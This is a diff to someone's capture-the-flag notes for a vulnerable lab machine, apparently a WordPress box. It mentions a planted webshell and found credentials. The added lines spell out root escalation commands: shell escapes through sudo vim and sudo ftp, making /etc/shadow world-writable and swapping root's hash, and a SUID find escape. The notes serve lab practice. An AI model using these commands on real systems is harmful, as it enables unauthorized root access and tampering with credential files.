@@ -112,6 +112,7 @@ c0ldd:9876543210
 - damn i can edit any file raw 
 - added in the [[webshells]] in the `comments.php` file 
 - got shell as `www-data` 
+## access
 - i can see config.php
 - new creds found for `c0ldd`:
 ```
@@ -121,10 +122,33 @@ c0ldd:cybersecurity
 - yup works 
 - got `user.txt` 
 - can run these as `sudo` 
-```
+```sh
 (root) /usr/bin/vim
 (root) /bin/chmod
 (root) /usr/bin/ftp
 ```
-- got root with `gtfobins` 
-- got `root.txt` 
+#### root with vim:
+```sh
+sudo vim -c ':!/bin/bash'
+```
+- rooted :3
+#### root with chmod 
+```sh 
+LFILE=/etc/shadow
+sudo chmod 6777 $LFILE
+vim /etc/shadow
+(replace roots hash with c0ldds hash)
+su root
+```
+- boom rooted :D
+#### root with ftp 
+```sh
+sudo ftp
+!/bin/bash
+```
+- rooted :3
+#### root with find (SUID)
+```sh
+find . -exec /bin/bash -p \; -quit
+```
+- muhehehe
